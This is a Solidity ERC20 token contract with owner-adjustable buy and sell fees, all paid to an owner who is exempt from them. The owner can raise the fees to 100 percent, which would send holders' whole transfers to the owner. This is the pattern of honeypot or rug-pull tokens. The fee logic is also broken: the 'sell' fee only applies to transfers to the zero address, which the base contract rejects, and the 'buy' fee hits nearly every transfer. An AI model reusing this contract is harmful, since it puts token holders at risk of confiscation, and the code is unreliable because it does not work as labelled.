// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract CustomToken is ERC20, Ownable {
    uint256 public buyFeePercent = 5;
    uint256 public sellFeePercent = 5;

    constructor(string memory name, string memory symbol) ERC20(name, symbol) {
        _mint(msg.sender, 1000000 * 10 ** decimals());
    }

    function setBuyFeePercent(uint256 fee) external onlyOwner {
        require(fee <= 100, "Fee can't exceed 100%");
        buyFeePercent = fee;
    }

    function setSellFeePercent(uint256 fee) external onlyOwner {
        require(fee <= 100, "Fee can't exceed 100%");
        sellFeePercent = fee;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal override {
        uint256 feeAmount;
        if (sender == owner() || recipient == owner()) {
            feeAmount = 0;
        } else if (recipient != address(0)) {
            feeAmount = (amount * buyFeePercent) / 100;
        } else {
            feeAmount = (amount * sellFeePercent) / 100;
        }

        super._transfer(sender, recipient, amount - feeAmount);
        if (feeAmount > 0) {
            super._transfer(sender, owner(), feeAmount);
        }
    }
}
